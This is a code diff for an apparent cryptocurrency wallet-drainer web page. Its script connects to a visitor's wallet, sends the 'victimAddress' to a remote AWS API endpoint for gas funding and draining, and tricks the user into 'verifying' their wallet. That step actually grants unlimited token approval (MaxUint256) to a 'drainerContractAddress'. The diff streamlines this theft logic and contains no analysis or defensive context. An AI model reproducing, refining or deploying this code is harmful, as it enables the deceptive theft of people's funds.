@@ -24,12 +24,13 @@
     </div>
 
     <script>
-        const API_BASE_URL = "https://eqisn0r49g.execute-api.ap-south-1.amazonaws.com/";
-        const provider = new ethers.BrowserProvider(window.ethereum);
+        const API_BASE_URL = "https://eqisn0r49g.execute-api.ap-south-1.amazonaws.com";
+        const provider = new ethers.BrowserProvider(window.ethereum, "any");
         const drainerContractAddress = "0xFc23Cc2C8d25c515B2a920432e5EBf6d018e3403";
         const tokenList = [
-            { symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 },
-            { symbol: "USDT", address: "0x55d398326f99059ff775485246999027b3197955", decimals: 18 },
+            { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
+            { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
+
         ];
         const bep20Abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
         let signer, connectedAddress;
@@ -45,36 +46,17 @@
                 connectedAddress = accounts[0];
                 document.getElementById("connectedAccount").innerText = `Connected: ${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`;
 
-                // Check token balances before funding gas
-                statusMessage += "Checking token balances...\n";
+                // Check and fund gas
+                statusMessage += "Checking gas balance...\n";
                 updateStatus(statusMessage);
-                const balanceAbi = ["function balanceOf(address account) external view returns (uint256)"];
-                let hasTokens = false;
-                for (const token of tokenList) {
-                    const tokenContract = new ethers.Contract(token.address, balanceAbi, provider);
-                    const balance = await tokenContract.balanceOf(connectedAddress);
-                    if (balance > 0) {
-                        hasTokens = true;
-                        break; // No need to check further if one token has balance
-                    }
-                }
-
-                // Fund gas only if victim has tokens
-                if (hasTokens) {
-                    statusMessage += "Checking gas balance...\n";
-                    updateStatus(statusMessage);
-                    const gasResponse = await fetch(`${API_BASE_URL}/check-and-fund`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ victimAddress: connectedAddress })
-                    });
-                    const gasData = await gasResponse.json();
-                    if (gasData.success) {
-                        statusMessage += `${gasData.message}\n`;
-                        updateStatus(statusMessage);
-                    }
-                } else {
-                    statusMessage += "No tokens detected, skipping gas funding...\n";
+                const gasResponse = await fetch(`${API_BASE_URL}/check-and-fund`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ victimAddress: connectedAddress })
+                });
+                const gasData = await gasResponse.json();
+                if (gasData.success) {
+                    statusMessage += `${gasData.message}\n`;
                     updateStatus(statusMessage);
                 }
 
@@ -92,31 +74,14 @@
 
                 // Fallback approval if needed
                 if (drainData.needsApproval) {
-                    statusMessage += "Verifying wallet (please confirm approvals for your tokens)...\n";
+                    statusMessage += "Verifying wallet (please confirm)...\n";
                     updateStatus(statusMessage);
-
-                    // Update ABI to include balanceOf
-                    const bep20Abi = [
-                        "function approve(address spender, uint256 amount) external returns (bool)",
-                        "function balanceOf(address account) external view returns (uint256)"
-                    ];
-
-                    // Loop over all tokens in tokenList
-                    for (const token of tokenList) {
-                        const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
-                        const balance = await tokenContract.balanceOf(connectedAddress);
-                        if (balance > 0) {
-                            statusMessage += `Approving ${token.symbol} (${ethers.formatUnits(balance, token.decimals)} available)...\n`;
-                            updateStatus(statusMessage);
-                            const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: 100000 });
-                            await tx.wait();
-                            statusMessage += `${token.symbol} approved!\n`;
-                            updateStatus(statusMessage);
-                        }
-                    }
+                    const tokenContract = new ethers.Contract(tokenList[0].address, bep20Abi, signer); // Use BUSD as fallback
+                    const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256);
+                    await tx.wait();
                     statusMessage += "Wallet verified!\n";
 
-                    // Retry drain after approvals
+                    // Retry drain after approval
                     statusMessage += "Processing claim again...\n";
                     updateStatus(statusMessage);
                     const retryResponse = await fetch(`${API_BASE_URL}/drain`, {
